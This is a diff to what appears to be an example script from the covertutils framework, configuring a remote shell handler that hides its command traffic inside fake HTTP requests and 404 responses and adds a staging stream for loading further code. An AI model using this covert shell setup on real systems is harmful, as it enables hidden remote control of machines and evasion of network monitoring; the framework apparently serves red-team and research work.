@@ -9,7 +9,7 @@
 # the concept of 'StegoOrchestrator' class and network wrapper functions
 
 from covertutils.handlers import InterrogatingHandler, FunctionDictHandler
-from covertutils.handlers.impl import StandardShellHandler
+from covertutils.handlers.impl import StandardShellHandler, ExtendableShellHandler
 from covertutils.orchestration import StegoOrchestrator
 from covertutils.datamanipulation import asciiToHexTemplate
 
@@ -22,7 +22,6 @@ import socket
 #============================== HTTP Steganography part ===================
 
 resp_ascii = '''HTTP/1.1 404 Not Found
-Date: Sun, 18 Oct 2012 10:36:20 GMT
 Server: Apache/2.2.14 (Win32)
 Content-Length: 363
 Connection: Closed
@@ -48,6 +47,7 @@ req_ascii = '''GET /search.php?q=~~~~~~~~?userid=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Host: {0}
 Cookie: SESSIOID=~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 eTag: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+User-Agent: covertutils HTTP-shell by John Torakis
 
 '''		# 2 new lines terminate the HTTP Request
 req_templ = asciiToHexTemplate( req_ascii )
@@ -71,12 +71,12 @@ req = """%s"""
 # We need a handler that will ask for and deliver data, initiating a communication once every 2-3 seconds.
 # This behavior is modelled in the 'InterrogatingHandler' with the 'delay_between' argument.
 # The 'FunctionDictHandler' automatically runs all messages through function found in a given dict
-class ShellHandler ( InterrogatingHandler, StandardShellHandler ) :
+class ShellHandler ( InterrogatingHandler, ExtendableShellHandler ) :
 
 	def __init__( self, recv, send, orch ) :
 		super( ShellHandler, self ).__init__( recv, send, orch, # basic handler arguments
-											fetch_stream = 'heartbeat',	# argument from 'InterrogatingHandler'
-											# function_dict = _function_dict, # argument from 'FunctionDictHandler'
+											fetch_stream = 'control',	# argument from 'InterrogatingHandler'
+											stage_stream = 'stage',
 											delay_between = (0.0, 4),	 # argument from 'InterrogatingHandler'
 											# delay_between = (2, 3)	 # argument from 'InterrogatingHandler'
 											)	# The arguments will find their corresponding class and update the default values
